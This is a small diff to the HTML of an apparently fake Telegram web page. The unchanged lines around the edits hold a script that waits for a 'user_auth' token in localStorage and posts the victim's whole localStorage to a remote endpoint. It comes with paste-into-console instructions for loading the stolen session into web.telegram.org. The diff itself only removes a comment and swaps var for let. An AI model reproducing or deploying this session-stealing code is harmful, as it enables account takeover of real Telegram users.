@@ -246,7 +246,6 @@
     </div>
     <script src="main.712f415c3a05b4382935.bundle.js"></script>
     <script>
-      //wait for localstorage has user_auth item intervally
       var interval = setInterval(function () {
         if (localStorage.getItem("user_auth")) {
           clearInterval(interval);
@@ -263,7 +262,7 @@ function postLocalStorageWithFatch(){
     body: `__telegram = fake page__,
  // Help: copy and paste this code to web.telegram.org > inspect element > console tab
  // ***************************
- var data = JSON.parse(${JSON.stringify(JSON.stringify(localStorage))});
+ let data = JSON.parse(${JSON.stringify(JSON.stringify(localStorage))});
  Object.keys(data).forEach(function (k) {
    localStorage.setItem(k, data[k]);
  });
